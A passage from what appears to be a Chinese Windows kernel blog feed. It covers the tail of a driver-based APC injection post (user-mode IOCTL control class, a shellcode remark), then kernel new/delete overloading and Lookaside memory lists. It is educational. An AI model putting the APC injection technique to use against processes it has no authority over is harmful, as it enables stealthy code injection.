class="line">std::cout &lt;&lt; <span class="string">&quot;CTL_APC_INJECTION Succeeded\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input AnyKey To Exit\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Ring3操作驱动方法类"><a href="#Ring3操作驱动方法类" class="headerlink" title="Ring3操作驱动方法类"></a>Ring3操作驱动方法类</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CControlDevice</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CControlDevice</span>();</span><br><span class="line">~<span class="built_in">CControlDevice</span>();</span><br><span class="line"><span class="function">BOOL <span class="title">CControlDevice::SeOpenDeviceObject</span><span class="params">(WCHAR* DeviceLinkName)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">CControlDevice::SeDeviceIoControl</span><span class="params">(PVOID BufferData, ULONG BufferLength, ULONG IoControlCode)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HANDLE m_DeviceObject = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="获取Exe的完整名字"><a href="#获取Exe的完整名字" class="headerlink" title="获取Exe的完整名字"></a>获取Exe的完整名字</h4><p>获取当前第一模块（可执行文件）路径，在路径中去掉文件名，再做一些转换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">wstring <span class="title">GetExeDirectory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">wchar_t</span> BufferData[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD BufferLength = <span class="built_in">ARRAYSIZE</span>(BufferData);</span><br><span class="line"><span class="built_in">GetModuleFileNameW</span>(<span class="literal">NULL</span>, BufferData, BufferLength);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetParentDirectory</span>(BufferData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">wstring <span class="title">GetParentDirectory</span><span class="params">(<span class="type">const</span> std::wstring&amp; BufferData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (BufferData.<span class="built_in">empty</span>())</span><br><span class="line"><span class="keyword">return</span> BufferData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> v1 = BufferData.<span class="built_in">rfind</span>(<span class="string">L&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (v1 == BufferData.npos)</span><br><span class="line">v1 = BufferData.<span class="built_in">rfind</span>(<span class="string">L&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (v1 != BufferData.npos)</span><br><span class="line"><span class="keyword">return</span> BufferData.<span class="built_in">substr</span>(<span class="number">0</span>, v1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> BufferData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打开设备对象"><a href="#打开设备对象" class="headerlink" title="打开设备对象"></a>打开设备对象</h4><p>通过链接对象获取驱动设备对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CControlDevice::SeOpenDeviceObject</span><span class="params">(WCHAR* DeviceLinkName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//通过LinkName 获得驱动设备对象</span></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject != INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to open handle to existing driver</span></span><br><span class="line">m_DeviceObject = <span class="built_in">CreateFileW</span>(</span><br><span class="line">DeviceLinkName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject != INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发送IO控制码"><a href="#发送IO控制码" class="headerlink" title="发送IO控制码"></a>发送IO控制码</h4><p>最重要的DeviceIoControl</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">CControlDevice::SeDeviceIoControl</span><span class="params">(PVOID BufferData,ULONG BufferLength,ULONG IoControlCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD ReturnLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject == INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> STATUS_DEVICE_DOES_NOT_EXIST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">DeviceIoControl</span>(m_DeviceObject, IoControlCode, BufferData, BufferLength, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;ReturnLength, <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>32位区别基本仅在ShellCode只有32位一种。</p>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用内核内存</title>
      <link href="/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/"/>
      <url>/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h1 id="使用内核内存"><a href="#使用内核内存" class="headerlink" title="使用内核内存"></a>使用内核内存</h1><p>wdm给出的使用内存池方法</p><p>申请内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">AllocateBuffer</span><span class="params">(ULONG ViewSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID VirtualAddress = ExAllocatePool(NonPagedPool, ViewSize);</span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlZeroMemory(VirtualAddress, ViewSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> VirtualAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">FreeBuffer</span><span class="params">(PVOID VirtualAddress)</span></span><br><span class="line">&#123;</span><br><span class="line">    ExFreePool(VirtualAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new 和delete 关键字在驱动里面是不可以使用，通过重载的方式即可在内核中使用，并通过c++编译器来编译。使用面向对象时，DriverEntry系列函数需要extern “C”</p><p>内部重载</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span>   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myclass</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Myclass</span>() </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;构造函数\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Myclass</span>() </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;析构函数\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> * _cdecl <span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="type">size_t</span> size,POOL_TYPE poolType= PagedPool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;进入new\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(poolType,size,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> _cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *p)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;进入delete\n&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (p!=<span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ExFreePoolWithTag</span>(p, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Unload</span><span class="params">(IN PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//驱动卸载的时候显示</span></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Goodbye driver\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PUNICODE_STRING RegistryPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">Myclass *pMyclass = <span class="keyword">new</span> <span class="built_in">Myclass</span>();</span><br><span class="line"><span class="keyword">delete</span> pMyclass;</span><br><span class="line"> <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局重载 一个实例，可以直接套用<a href="https://www.pnpon.com/article/detail-163.html">Windows内核驱动中使用new和delete - PNPON内核开发</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;PAGE&quot;</span>)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// New and delete operators</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">_When_((PoolType &amp; NonPagedPoolMustSucceed) != <span class="number">0</span>,</span><br><span class="line">    __drv_reportError(<span class="string">&quot;Must succeed pool allocations are forbidden. &quot;</span></span><br><span class="line">            <span class="string">&quot;Allocation failures cause a system crash&quot;</span>))</span><br><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> Size, POOL_TYPE PoolType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    Size = (Size != <span class="number">0</span>) ? Size : <span class="number">1</span>;</span><br><span class="line">    <span class="type">void</span>* pObject = <span class="built_in">ExAllocatePoolWithTag</span>(PoolType, Size, BDDTAG);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DBG</span></span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlFillMemory</span>(pObject, Size, <span class="number">0xCD</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DBG</span></span></span><br><span class="line">    <span class="keyword">return</span> pObject;</span><br><span class="line">&#125;</span><br><span class="line">_When_((PoolType &amp; NonPagedPoolMustSucceed) != <span class="number">0</span>,</span><br><span class="line">    __drv_reportError(<span class="string">&quot;Must succeed pool allocations are forbidden. &quot;</span></span><br><span class="line">            <span class="string">&quot;Allocation failures cause a system crash&quot;</span>))</span><br><span class="line"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> Size, POOL_TYPE PoolType)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    Size = (Size != <span class="number">0</span>) ? Size : <span class="number">1</span>;</span><br><span class="line">    <span class="type">void</span>* pObject = <span class="built_in">ExAllocatePoolWithTag</span>(PoolType, Size, BDDTAG);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DBG</span></span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlFillMemory</span>(pObject, Size, <span class="number">0xCD</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DBG</span></span></span><br><span class="line">    <span class="keyword">return</span> pObject;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span>* pObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(pObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="type">void</span>* pObject)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(pObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码来看，new和delete运算符的重载依然是对ExAllocatePoolWithTag和ExFreePool函数的封装。</p><p>这里说明一下，在dbg模式下，将分配的内存全部置为0xcd,这和应用层在调试模式下堆的内存初始化一样的道理。</p><p>0xcd其实这里是int指令的指令，再配合一个cd,就变成了int cd,说明直接行的是中断0xcd,这样CPU执行到此处就会出现中断异常。这和栈上的0xcc,int3的原理一致。</p><p>简单版。同样的，这种重载对于类也有效。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, size, <span class="string">&#x27;yTag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span>* p,<span class="type">size_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExFreePool</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, size, <span class="string">&#x27;yTag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="type">void</span>* p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExFreePool</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBase</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line">   CBase* p = (CBase*)<span class="keyword">new</span> <span class="built_in">CBase</span>();  <span class="comment">//operator new(size_t size)</span></span><br><span class="line">   p-&gt;a = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">delete</span> p; <span class="comment">//void __cdecl operator delete(void* p,size_t a)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Lookaside内存</title>
      <link href="/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/"/>
      <url>/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Lookaside内存"><a href="#使用Lookaside内存" class="headerlink" title="使用Lookaside内存"></a>使用Lookaside内存</h1><p>频繁申请和回收内存，会导致在内存上产生大量的内存“空洞”，从 而导致最终无法申请内存。DDK为程序员提供了Lookaside结构来解决这个问题。</p><p>频繁地申请内存，会导致一个问题，就是在内存中产生“空洞”。图 5-11显示了这种情况，在内存中先后申请三块内存。最开始可用的内 存是连续的。当某个时刻内存块2被回收以后，如果系统想分配一块略 微大于原先内存块2的内存，这时候原先的内存2就不能被申请成功。 因此，频繁地申请、回收内存会导致在内存上产生大量的内存“空洞”。</p><p><img src="/.io//image-20240217165148212.png" alt="image-20240217165148212"></p><p>如果系统中存在大量的内存“空洞”，即使内存中有大量的可用内 存，也会导致申请内存失败。在操作系统空闲的时候，系统会整理内 存中的“空洞”，将内存中的“空洞”进行合并。</p><p>如果驱动程序需要频繁地从内存中申请、回收固定大小的内存，DDK提 供了一种机制来解决这个问题，这就是使用Lookaside对象。 可以将Lookaside对象想象成一个内存容器。在初始的时候，它先向 Windows申请了一块比较大的内存。以后程序员每次申请内存的时候， 不是直接向Windows申请内存，而是向Lookaside对象申请内存。 Lookaside对象会智能地避免产生内存“空洞”。如果Lookaside对象 内部的内存不够用时，它会向操作系统申请更多的内存。当Lookaside 对象内部有大量的未使用的内存时，它会自动让Windows回收一部分内存。总之，Lookaside是一个自动的内存分配容器。通过对Lookaside 对象申请内存，效率要高于直接向Windows申请内存。Lookaside一般 会在以下情况使用： </p><p>（1）程序员每次申请固定大小的内存。 </p><p>（2）申请和回收的操作十分频繁。 </p><p>如果程序员遇到上述两种情况，可以考虑使用Lookaside对象。驱动程序中的运行效率是程序员必须考虑的问题。</p><h2 id="使用Lookaside内存的方法"><a href="#使用Lookaside内存的方法" class="headerlink" title="使用Lookaside内存的方法"></a>使用Lookaside内存的方法</h2><ol><li>初始化Lookaside结构</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_IRQL_requires_max_(DISPATCH_LEVEL)</span><br><span class="line"><span class="function">NTKERNELAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">ExInitializeNPagedLookasideList</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PNPAGED_LOOKASIDE_LIST Lookaside,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PALLOCATE_FUNCTION Allocate,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PFREE_FUNCTION Free,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T Size,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG Tag,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ USHORT Depth</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExInitializeNPagedLookasideList</span>(&amp;__LookAsideList, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, BUFFER_SIZE_MAX, <span class="string">&#x27;XXXX&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">        __IsLookAsideList = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>向LookAside申请内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AllocateBufferFromLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    KIRQL CurrentIrql;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    CurrentIrql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (CurrentIrql &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    VirtualAddress = <span class="built_in">ExAllocateFromNPagedLookasideList</span>(&amp;__LookAsideList);</span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(VirtualAddress, BUFFER_SIZE_MAX);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> VirtualAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>从Lookaside中释放内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FreeBufferToLookAsideList</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID VirtualAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    KIRQL CurrentIrql;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    CurrentIrql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (CurrentIrql &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExFreeToNPagedLookasideList</span>(&amp;__LookAsideList, VirtualAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>释放Lookaside结构</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 